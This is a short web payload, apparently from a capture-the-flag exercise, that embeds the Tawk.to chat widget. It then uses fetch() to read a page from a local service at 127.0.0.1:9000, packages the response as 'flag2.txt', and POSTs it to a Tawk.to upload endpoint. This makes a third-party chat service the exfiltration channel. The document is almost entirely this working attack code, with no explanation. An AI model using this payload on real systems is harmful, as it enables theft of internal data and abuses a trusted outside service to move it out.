<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/6220693e1ffac05b1d7cb5f1/1ft79m8av';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
fetch("http://127.0.0.1:9000/view/9b77c996-8a3b-42b2-88af-4ff19b20de47").then((res) => {
    return res.text();
}).then(data => {
    var formData = new FormData();
    var file = new File([data], "flag2.txt", {
    type: "text/plain",
});

formData.append("upload", file);

fetch("https://upload.tawk.to/upload/page/agent?handle=2877ac153424cdd462c653127eaa993a5f483ca0&pageId=6220693e1ffac05b1d7cb5f1&agentSessionId=62206769694e920ad4a046da",{
        method: 'POST',
        body: formData
    });

})
